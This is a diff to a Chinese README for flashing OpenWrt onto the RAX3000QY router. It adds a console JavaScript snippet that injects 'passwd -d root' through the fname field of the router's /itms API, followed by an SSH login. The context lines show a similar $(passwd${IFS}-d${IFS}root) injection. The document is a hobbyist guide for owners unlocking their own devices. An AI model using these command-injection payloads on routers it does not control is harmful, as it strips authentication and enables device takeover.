@@ -20,6 +20,43 @@
 - 再通过 `$(passwd${IFS}-d${IFS}root)` 来删除 root 的密码
 - 使用 ssh 命令来连接路由器：`ssh root@192.168.x.x` 后将会直接进入而不会询问密码
 
+#### 同型号提示“无效地址”的处理方法
+
+- 打开 Chrome 调试窗口，切换到「网络（Network）」
+- 刷新页面后，找到 `items` 相关的 POST 请求
+- 在「负载（Payload）」中找到 `sessionId` 并记录
+- 切换到「控制台（Console）」，输入以下脚本（注意替换 `sessionId` 和 IP，示例里是 `cmcc.wifi`）：
+
+  ```javascript
+  var url = "http://cmcc.wifi/itms";
+  var params = {
+    cmd: 22,
+    fname: "websys.log|passwd -d root",
+    method: "get",
+    sessionId: "98eca7a1fc3c731fa2de89c04348bb69"
+  };
+  var xhr = new XMLHttpRequest();
+  xhr.open("POST", url, true);
+  xhr.setRequestHeader("Content-Type", "application/json");
+  xhr.onload = function (e) {
+    if (xhr.readyState === 4) {
+      if (xhr.status === 200) {
+        console.log(xhr.responseText);
+      } else {
+        console.error(xhr.statusText);
+      }
+    }
+  };
+  xhr.onerror = function (e) {console.error(xhr.statusText);};
+  xhr.send(JSON.stringify(params));
+  ```
+
+- 控制台返回空字符串 `""` 后，即可通过 SSH 连接：
+
+  ```bash
+  ssh -oHostKeyAlgorithms=+ssh-rsa root@cmcc.wifi
+  ```
+
 ### 2. 取得 Telnet（二选一）
 
 - 首先进入后台页面 (后台地址、用户名和密码请看路由器背面)
@@ -60,5 +97,4 @@
 ---
 
 ![Star History Chart](https://api.star-history.com/svg?repos=sfxfs/rax3000qy-OpenWrt&type=Date)
-
 
